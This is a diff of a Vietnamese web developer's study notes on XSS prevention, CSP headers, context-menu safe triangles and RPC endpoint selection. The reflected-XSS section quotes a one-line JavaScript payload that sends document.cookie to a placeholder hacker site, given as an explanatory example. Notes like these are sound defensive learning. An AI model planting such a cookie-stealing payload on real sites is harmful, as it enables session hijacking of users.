@@ -1,7 +1,7 @@
 # Cách kiểu tấn công XSS
 innterHTML thì ngừoi dùng có thể input code js nguy hiểm, dùng textContent có thể tránh được.
 innerHTML có thể bị XSS nên React đã đổi thành dangerouslySetInnerHTML và khuyên k nên dùng. VD: <div dangerouslySetInnerHTML={{ __html: htmlContent }} />
-Tương tự thuộc tính href thẻ a cũng k an toàn. Khuyên dùng encodeURIComponent để chuyển ký tự đặc biệt thành html entity.
+Tương tự thuộc tính href thẻ a cũng k an toàn. Khuyên dùng encodeURIComponent để chuyển ký tự đặc biệt thành html entity trước
 
 -> Reflected XSS
 User login 1 trang web sẽ có session cookies -> Hacker gửi cho người dùng 1 URL tới trang web đó nhưng tham số có chứa mã XSS -> người dùng truy cập vào URL đó thì gửi request tới server với mã XSS của hacker -> server xử lý và trả lại ngừoi dùng hiển thị ra màn hình. VD đoạn mã là: var i=new Image; i.src=”http://hacker-site.net/”+document.cookie; -> Browser hiển thị ra màn hình sẽ thực hiện script và gửi session cookie cho hacker.
@@ -31,6 +31,7 @@ VD: tính năng search gõ liên tục sẽ chỉ tự thực hiện search sau 
 # Tạo safe triangle cho context menu
 Giải thích rõ cơ chế ở: https://www.smashingmagazine.com/2023/08/better-context-menus-safe-triangles/
 Cụ thể là xử lý sự kiện mouse enter và mouse leave. Dùng toán check con chuột trong hình tam giác thì disable mouse pointer event đi là xong
+Safe triangle bên cạnh việc di chuột trong vùng, nếu chuột bị di chậm hoặc đứng yên cũng tự tắt.
 
 
 
@@ -123,4 +124,11 @@ form-action 'self' .online15.net: Chỉ định các nguồn mà biểu mẫu c�
 script-src 'self' 'nonce-{req.nonce}' .online15.net .aptrinsic.com: Cho phép chạy script từ cùng một nguồn và từ các miền cụ thể, với điều kiện rằng script có nonce (một giá trị duy nhất cho mỗi yêu cầu) để ngăn chặn việc chèn script độc hại. Thẻ script trong dự án phải có thêm trường nonce
 connect-src .sharepointguild.com .online15.net .aptrinsic.com .segment.com .segment.io 'self': Chỉ định các nguồn mà trang có thể thực hiện các kết nối (như WebSocket, AJAX).
 
+
+
+# Tìm best url trong list url
+VD có 1 list rpc như nhau, cần chọn ra best url để gọi vào, rpc có thể chết bất cứ lúc nào.
+=> Mỗi khi user vào trang web sẽ query thử 1 lệnh đơn giản (như getBlockNumber) cả list rpc với Promise.any xem cái nào trả nhanh nhất thì lấy
+Nếu có lỗi mạng thì sẽ tự chọn second-best url query lại, khi refresh lại pages sẽ chọn lại url luôn.
+=> ref tới projects "Vatra"
 
